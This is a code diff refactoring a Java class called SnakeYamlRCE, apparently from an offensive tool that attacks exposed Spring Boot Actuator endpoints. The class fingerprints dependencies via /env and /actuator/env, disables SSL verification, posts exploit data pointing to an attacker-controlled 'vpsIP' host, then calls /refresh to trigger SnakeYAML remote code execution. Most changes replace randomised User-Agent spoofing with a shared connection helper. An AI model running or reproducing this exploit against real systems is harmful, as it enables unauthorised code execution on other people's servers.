@@ -1,22 +1,20 @@
 package src.main.module;
 
-import src.main.LoadLib.ClassCom.ClsComp;
-import src.main.LoadLib.JARLoad.LoadJarLib;
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
+import src.main.loadlib.ClassCom.ClsComp;
+import src.main.loadlib.JARLoad.LoadJarLib;
 import src.main.impl.ResultCallback;
 
 import java.io.*;
 import java.net.HttpURLConnection;
-import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.Base64;
-import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class SnakeYamlRCE {
     private String address;
@@ -51,16 +49,10 @@ public class SnakeYamlRCE {
         String data = "";
         String ref = "/refresh";
         String refsite = address + ref;
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK || (responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR && count!=0)){
                 InputStream inputStream = (responseCode == HttpURLConnection.HTTP_OK) ? conn.getInputStream() : conn.getErrorStream();
@@ -107,10 +99,7 @@ public class SnakeYamlRCE {
                                 e.printStackTrace();
                             }
                             data = String.format(expdata1,vpsIP);
-                            URL obj1 = new URL(site);
-                            HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                            ua = uacf.getRandomUserAgent(ualist);
-                            conn1.setRequestProperty("User-Agent",ua);
+                            HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                             conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                             conn1.setRequestMethod("POST");
                             conn1.setDoOutput(true);
@@ -121,10 +110,8 @@ public class SnakeYamlRCE {
                             int responseCode1 = conn1.getResponseCode();
                             if (responseCode1 == HttpURLConnection.HTTP_OK){
                                 try{
-                                    URL obj2 = new URL(refsite);
-                                    HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+                                    HttpURLConnection conn2 = HTTPConfig.createConnection(refsite);
                                     conn2.setRequestMethod("POST");
-                                    conn2.setRequestProperty("User-Agent",ua);
                                     conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                                     conn2.setDoOutput(true);
                                     int responseCode2 = conn2.getResponseCode();
@@ -173,10 +160,7 @@ public class SnakeYamlRCE {
                                 e.printStackTrace();
                             }
                             data = String.format(expdata1,vpsIP);
-                            URL obj1 = new URL(site);
-                            HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                            ua = uacf.getRandomUserAgent(ualist);
-                            conn1.setRequestProperty("User-Agent",ua);
+                            HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                             conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                             conn1.setRequestMethod("POST");
                             conn1.setDoOutput(true);
@@ -187,10 +171,8 @@ public class SnakeYamlRCE {
                             int responseCode1 = conn1.getResponseCode();
                             if (responseCode1 == HttpURLConnection.HTTP_OK){
                                 try{
-                                    URL obj2 = new URL(refsite);
-                                    HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+                                    HttpURLConnection conn2 = HTTPConfig.createConnection(refsite);
                                     conn2.setRequestMethod("POST");
-                                    conn2.setRequestProperty("User-Agent",ua);
                                     conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                                     conn2.setDoOutput(true);
                                     int responseCode2 = conn2.getResponseCode();
@@ -239,16 +221,10 @@ public class SnakeYamlRCE {
         String data = "";
         String ref = "/actuator/refresh";
         String refsite = address + ref;
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             String inputLine;
@@ -279,10 +255,7 @@ public class SnakeYamlRCE {
                         Files.delete(Paths.get(System.getProperty("user.dir") + "/resources/SnakeYaml.java"));
                         Files.delete(Paths.get(System.getProperty("user.dir") + "/resources/SnakeYaml.class"));
                         data = String.format(expdata2,vpsIP);
-                        URL obj1 = new URL(site);
-                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                        ua = uacf.getRandomUserAgent(ualist);
-                        conn1.setRequestProperty("User-Agent",ua);
+                        HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                         conn1.setRequestProperty("Content-Type","application/json");
                         conn1.setRequestMethod("POST");
                         conn1.setDoOutput(true);
@@ -293,10 +266,8 @@ public class SnakeYamlRCE {
                         int responseCode1 = conn1.getResponseCode();
                         if (responseCode1 == HttpURLConnection.HTTP_OK){
                             try{
-                                URL obj2 = new URL(refsite);
-                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+                                HttpURLConnection conn2 = HTTPConfig.createConnection(refsite);
                                 conn2.setRequestMethod("POST");
-                                conn2.setRequestProperty("User-Agent",ua);
                                 conn2.setRequestProperty("Content-Type","application/json");
                                 conn2.setDoOutput(true);
                                 int responseCode2 = conn2.getResponseCode();
@@ -338,16 +309,10 @@ public class SnakeYamlRCE {
         String site = address + "/env";
         String llib = "spring-boot-starter-actuator";
         String llib1 = "spring-cloud-starter";
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK || (responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR && count != 0)) {
                 InputStream inputStream = (responseCode == HttpURLConnection.HTTP_OK) ? conn.getInputStream() : conn.getErrorStream();
@@ -370,10 +335,8 @@ public class SnakeYamlRCE {
                         callback.onResult(text);
                         text = String.format("spring-cloud-starter 依赖为: %s", matcher1.group(1));
                         callback.onResult(text);
-                        URL obj1 = new URL(address + "/actuator");
-                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                        HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                         conn1.setDoOutput(true);
-                        conn1.setRequestProperty("User-Agent", ua);
                         conn1.setRequestMethod("GET");
                         int responseCode1 = conn1.getResponseCode();
                         BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -403,16 +366,10 @@ public class SnakeYamlRCE {
         String site = address + "/actuator/env";
         String llib = "spring-boot-starter-actuator";
         String llib1 = "spring-cloud-starter";
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK || (responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR && count != 0)) {
                 InputStream inputStream = (responseCode == HttpURLConnection.HTTP_OK) ? conn.getInputStream() : conn.getErrorStream();
@@ -435,10 +392,8 @@ public class SnakeYamlRCE {
                         callback.onResult(text);
                         text = String.format("spring-cloud-starter 依赖为: %s", matcher1.group(1));
                         callback.onResult(text);
-                        URL obj1 = new URL(address + "/actuator");
-                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                        HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                         conn1.setDoOutput(true);
-                        conn1.setRequestProperty("User-Agent", ua);
                         conn1.setRequestMethod("GET");
                         int responseCode1 = conn1.getResponseCode();
                         BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -467,14 +422,8 @@ public class SnakeYamlRCE {
     public void Exp(ResultCallback callback) throws IOException {
         String api ="/actuator/env";
         String site = address + api;
-        String ua = "";
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
